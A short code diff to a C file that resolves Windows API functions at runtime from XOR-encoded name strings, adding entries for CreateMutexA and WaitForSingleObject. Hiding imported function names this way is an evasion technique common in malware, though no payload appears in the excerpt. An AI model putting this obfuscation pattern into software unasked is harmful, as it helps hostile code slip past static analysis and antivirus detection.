@@ -1,5 +1,5 @@
 #include "PE.h"
-FARPROC APIArray[52];
+FARPROC APIArray[54];
 void resolveString(BYTE* buffer, BYTE* key, int size) {
 	for (int i = 0; i < size; i++) {
 		buffer[i] ^= 0xFF;
@@ -322,11 +322,24 @@ int initAPIArray() {
 	APIArray[50] = TempGetProcAddress(hShlwapi, (LPCSTR)PathFileExistsA_str);
 	APIArray[51] = TempGetProcAddress(hShlwapi, (LPCSTR)StrStrIA_str);
 
-	for (int i = 0; i < 52; i++) {
+	BYTE CreateMutexA_key[5] = { 119, 109, 190, 168, 74 };
+	BYTE CreateMutexA_str[13] = { 203, 224, 36, 54, 193, 237, 223, 52, 35, 208, 240, 211, 65 };
+	resolveString(CreateMutexA_str, CreateMutexA_key, 13);
+
+	APIArray[52] = TempGetProcAddress(hKernel32, (LPCSTR)CreateMutexA_str);
+
+	BYTE WaitForSingleObject_key[5] = { 106, 26, 216, 145, 77 };
+	BYTE WaitForSingleObject_str[20] = { 194, 132, 78, 26, 244, 250, 151, 116, 7, 220, 242, 137, 66, 33, 208, 255, 128, 68, 26, 178 };
+	resolveString(WaitForSingleObject_str, WaitForSingleObject_key, 20);
+
+	APIArray[53] = TempGetProcAddress(hKernel32, (LPCSTR)WaitForSingleObject_str);
+
+	for (int i = 0; i < 54; i++) {
 		if (!APIArray[i]) {
 			return -1;
 		}
 	}
+
 	return 0;
 }
 
